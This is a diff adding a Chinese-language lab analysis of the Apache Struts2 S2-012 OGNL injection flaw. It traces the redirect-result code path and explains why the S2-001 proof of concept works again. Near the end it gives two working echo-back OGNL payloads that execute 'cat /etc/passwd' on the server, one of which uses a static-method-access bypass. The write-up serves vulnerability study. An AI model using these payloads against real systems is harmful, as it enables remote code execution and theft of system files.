@@ -610,11 +610,83 @@ Struts2 `2.3.1.2`版本，依赖的XWork版本也是`2.3.1.2`，在拦截器`Par
 <a name="s2-012"></a>
 ## S2-012
 
+官方漏洞公告：<br>
+https://cwiki.apache.org/confluence/display/WW/S2-012
+
+影响版本：Struts 2.0.0 - Struts 2.3.14.2
+
 ## 漏洞复现与分析
 
+从漏洞公告中获悉漏洞会出现的场景：如果一个Action定义了一个变量比如`uname`，当触发了`redirect`类型的返回时，如果重定向的`url`后面带有`?uname=${uname}`，则在这个过程中会对`uname`参数的值进行OGNL表达式计算。
 
+下面用`vulhub/struts2/s2-012`中的应用进行调试分析。
+
+该应用中定义了`UserAction`，并配置了`redirect`类型的返回，重定向的地址`url`为：`/index.jsp?name=${name}`，如下图：
+
+<img src="pic/struts2_s2-012_1.png">
+
+从漏洞公告中可获悉，漏洞是发生在返回阶段。根据Struts2/XWork的运行主线的可知，`ActionInvocation`在调度完`Action`对象后，便会去调度`Result`对象，如下图：
+
+<img src="pic/struts2_s2-012_2.png" width=60% heigth=60%>
+
+>关于Struts2的运行主线等原理的详解可参考陆舟的《Struts2技术内幕》
+
+所以，我们可以在Struts2的核心调度对象`DefaultActionInvocation`中开始调度`Result`处下断点，如下图：
+
+<img src="pic/struts2_s2-012_3.png">
+
+继续调试，在`StrutsResultSupport#conditionalParse()`方法中，出现了一个熟悉的身影：`TextParseUtil#translateVariables()`，没错，这个方法在`S2-001`的漏洞触发执行栈中出现过。
+
+<img src="pic/struts2_s2-012_4.png">
+
+可是`S2-001`漏洞不是早就被修复了吗，为什么还能通过`TextParseUtil#translateVariables()`去触发漏洞？
+
+经调试发现，这里与`S2-001`还是稍有不同，这里调用的是`TextParseUtil`的一个重载方法，其中，第一个参数是一个`char`数组。而且如下图可以看到这里传入了包含两个元素的`char`数组，这就是`S2-012`为什么可以用`S2-001`的PoC直接打的关键。为什么呢，继续往下看。
+
+<img src="pic/struts2_s2-012_5.png">
+
+可以看到，这里的`while(true)`循环被放置到一个`for`循环里了，且`for`循环的次数由`char`数组`openChars`的长度决定，而这里传入的`openChars`的长度为`2`,两个元素分别为`$`和`%`字符。所以下面的`while(true)`循环会执行两次，第一次是解析`${name}`，解析得到结果后，继续对结果`%{xxx}`进行解析。因此使得`S2-001`漏洞重现了。(是不是感觉挺有意思的^_^)
+
+<img src="pic/struts2_s2-012_6.png">
 
 ### 可回显PoC
+
+综上，这里可以直接用`S2-001`的PoC执行任意命令：
+
+```
+%{#p=(new java.lang.ProcessBuilder(new java.lang.String[]{"cat","/etc/passwd"})).start(),
+#is=#p.getInputStream(),
+#br=new java.io.BufferedReader(new java.io.InputStreamReader(#is)),
+#arr=new char[50000],
+#br.read(#arr),
+#str=new java.lang.String(#arr),
+#writer=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),
+#writer.println(#str),
+#writer.flush(),
+#writer.close()}
+```
+
+<img src="pic/struts2_s2-012_21.png">
+
+如果要使用`Runtime#exec()`方法来执行命令也可以，不过要添加`#_memberAccess.allowStaticMethodAccess=true`。前面使用`ProcessBuilder#start()`，由于不需要调用静态方法，所以无需先将`SecurityMemberAccess`的`allowStaticMethodAccess`改为`true`。
+```
+%{#_memberAccess.allowStaticMethodAccess=true,
+#a=(@java.lang.Runtime@getRuntime().exec(new java.lang.String[]{"cat","/etc/passwd"})),
+#b=#a.getInputStream(),
+#c=new java.io.InputStreamReader(#b),
+#d=new java.io.BufferedReader(#c),
+#e=new char[50000],
+#d.read(#e),
+#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),
+#f.getWriter().println(new java.lang.String(#e)),
+#f.getWriter().flush(),
+#f.getWriter().close()}
+```
+
+<img src="pic/struts2_s2-012_20.png">
+
+或直接用`ProcessBuilder#start()`来代替`Runtime#exec()`方法。
+使用`ProcessBuilder#start()`的话，由于不需要调用静态方法，所以无需先将`SecurityMemberAccess`的`allowStaticMethodAccess`改为`true`。
 
 
 
